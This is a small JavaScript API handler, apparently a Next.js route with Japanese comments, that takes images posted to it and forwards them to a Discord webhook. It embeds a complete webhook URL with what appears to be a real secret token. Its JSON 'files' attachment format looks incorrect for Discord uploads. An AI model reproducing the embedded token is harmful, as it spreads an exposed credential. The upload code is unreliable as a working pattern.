export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { images } = req.body; // 画像データを受け取る
    // Discordへの送信処理
    try {
      const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u"; // 自分のWebhook URLに変更
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: '画像が届きました！',
          files: images.map((image, index) => ({
            attachment: image,
            name: `photo_${index + 1}.jpg`,
          })),
        }),
      });

      if (response.ok) {
        res.status(200).json({ message: '送信成功' });
      } else {
        res.status(500).json({ message: 'Discord送信失敗' });
      }
    } catch (error) {
      res.status(500).json({ message: 'エラー', error: error.message });
    }
  } else {
    res.status(405).json({ message: 'POST以外はダメ' });
  }
}
